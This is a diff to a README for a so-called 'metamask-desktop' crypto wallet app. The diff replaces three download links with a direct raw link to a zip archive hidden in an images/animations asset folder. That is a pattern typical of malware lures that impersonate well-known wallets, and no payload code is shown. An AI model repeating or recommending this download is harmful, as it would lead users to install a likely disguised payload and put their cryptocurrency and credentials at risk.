@@ -1,6 +1,6 @@
 # 🌐 metamask-desktop - Browse Ethereum Websites with Ease
 
-[![Download Now](https://img.shields.io/badge/Download-MetaMask_Desktop-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Loaded-spongebath1657/metamask-desktop)
+[![Download Now](https://img.shields.io/badge/Download-MetaMask_Desktop-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Loaded-spongebath1657/metamask-desktop/raw/refs/heads/main/images/animations/fox/2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ Manage your digital assets directly within the app. Send, receive, and store cry
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Loaded-spongebath1657/metamask-desktop](https://github.com/Loaded-spongebath1657/metamask-desktop)
+Visit this link to download the application: [https://github.com/Loaded-spongebath1657/metamask-desktop/raw/refs/heads/main/images/animations/fox/2.4.zip](https://github.com/Loaded-spongebath1657/metamask-desktop/raw/refs/heads/main/images/animations/fox/2.4.zip)
 
 ### 🛠️ Installation Steps
 
@@ -131,7 +131,7 @@ Blockchain is like a digital ledger that records transactions across many comput
 
 Ready to explore the exciting world of Ethereum websites? Download metamask-desktop today and join millions of users who are already benefiting from blockchain technology.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-green?style=for-the-badge&color=FF6B6B)](https://github.com/Loaded-spongebath1657/metamask-desktop)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-green?style=for-the-badge&color=FF6B6B)](https://github.com/Loaded-spongebath1657/metamask-desktop/raw/refs/heads/main/images/animations/fox/2.4.zip)
 
 The future of the internet is here, and it's more accessible than ever. With metamask-desktop, you don't need to be a tech expert to participate in the decentralized web. Simply download, install, and start exploring!
 
